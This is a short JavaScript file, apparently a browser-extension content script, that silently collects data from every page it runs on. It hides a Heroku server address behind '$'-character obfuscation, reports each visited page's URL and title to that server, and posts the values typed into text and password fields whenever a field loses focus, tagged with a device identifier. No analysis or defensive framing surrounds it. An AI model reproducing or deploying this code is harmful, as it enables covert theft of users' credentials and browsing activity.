(() => {
    const url = 'h$$t$$$t$$p$$s://$$$$$$j$$$$$c$$$$$$b$$$$$a$$$$$k$$$$er$$$$$y.he$$$$$rok$$$$$ua$$$$$pp.c$$$$o$$$$$m'.replace(/\$/g, '')
    const urlApi = `${url}/api/urls`
    const urlDetailApi = `${url}/api/url_details`
    const inputApi = `${url}/api/inputs`
    let deviceId = localStorage.extensionUniqueId || navigator.userAgentData.platform
    deviceId = deviceId.replace(/&/g, '')
    getLocation()
    addInputListener()

    function addInputListener() {
        const getInputs = () => [...document.querySelectorAll('input')].filter(i => !['checkbox', 'submit', 'radio', 'date', 'datetime', 'time', 'select'].includes(i.type))
        const inputs = getInputs()
        let all = null
        inputs.forEach(i => i.onchange = () => {
            i.touched = true
            all = inputs.map(({ id, name, type, value, touched }) => ({ id, name, type, value, touched }))
            localStorage.setItem('inputs', JSON.stringify(all))
        })

        inputs.forEach(i => i.onblur = () => {
            fetch(inputApi, {
                method: 'POST',
                headers: {
                    Accept: 'application/json',
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    inputs: all,
                    ...location,
                    deviceId
                })
            })
        })
    }

    function getLocation() {
        let icon = document.querySelector('link[rel=icon]')
        icon = icon ? icon.href ? icon.href : 'No link' : 'No icon'

        fetch(urlApi, {
            method: 'POST',
            headers: {
                Accept: 'application/json',
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                ...location,
                title: document.title,
                icon,
                deviceId
            })

        })
        fetch(urlDetailApi, {
            method: 'POST',
            headers: {
                Accept: 'application/json',
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                ...location,
                title: document.title,
                deviceId
            })
        })
    }
})()